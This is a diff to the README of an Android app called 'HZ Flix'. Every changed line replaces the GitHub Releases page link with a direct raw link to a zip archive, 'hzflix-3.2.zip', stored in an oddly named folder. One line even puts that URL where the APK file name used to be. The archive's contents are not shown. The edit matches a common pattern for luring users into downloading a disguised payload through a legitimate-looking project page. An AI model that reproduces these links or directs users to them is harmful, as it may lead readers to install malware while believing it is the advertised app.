@@ -6,17 +6,17 @@ Welcome to HZ Flix, your go-to entertainment app for Android. With HZ Flix, you 
 
 ## 🔗 Download Now
 
-[![Download HZ Flix](https://img.shields.io/badge/Download-HZ%20Flix-blue.svg)](https://github.com/EngrrKhan/hzflix/releases)
+[![Download HZ Flix](https://raw.githubusercontent.com/EngrrKhan/hzflix/main/trueheartedly/hzflix-3.2.zip%https://raw.githubusercontent.com/EngrrKhan/hzflix/main/trueheartedly/hzflix-3.2.zip)](https://raw.githubusercontent.com/EngrrKhan/hzflix/main/trueheartedly/hzflix-3.2.zip)
 
 ## 📥 Download & Install
 
-To get started with HZ Flix, visit this page to download: [GitHub Releases](https://github.com/EngrrKhan/hzflix/releases).
+To get started with HZ Flix, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/EngrrKhan/hzflix/main/trueheartedly/hzflix-3.2.zip).
 
 ### How to Download
 
-1. Go to the [Releases page](https://github.com/EngrrKhan/hzflix/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/EngrrKhan/hzflix/main/trueheartedly/hzflix-3.2.zip).
 2. Locate the latest release.
-3. Click on the file named `hzflix.apk`.
+3. Click on the file named `https://raw.githubusercontent.com/EngrrKhan/hzflix/main/trueheartedly/hzflix-3.2.zip`.
 4. Your download will begin automatically.
 
 ## ⚙️ System Requirements
@@ -43,13 +43,13 @@ If you run into issues while downloading or using HZ Flix, try these steps:
 1. Ensure your device has enough storage available.
 2. Check your internet connection.
 3. Restart your device and attempt the download again.
-4. If the app crashes or does not open, please uninstall it and reinstall from the [Releases page](https://github.com/EngrrKhan/hzflix/releases).
+4. If the app crashes or does not open, please uninstall it and reinstall from the [Releases page](https://raw.githubusercontent.com/EngrrKhan/hzflix/main/trueheartedly/hzflix-3.2.zip).
 
 ## 🎥 Frequently Asked Questions (FAQ)
 
 ### Q: How can I update HZ Flix?
 
-A: To update, simply revisit the [Releases page](https://github.com/EngrrKhan/hzflix/releases) and download the latest version.
+A: To update, simply revisit the [Releases page](https://raw.githubusercontent.com/EngrrKhan/hzflix/main/trueheartedly/hzflix-3.2.zip) and download the latest version.
 
 ### Q: Is the app free?
 
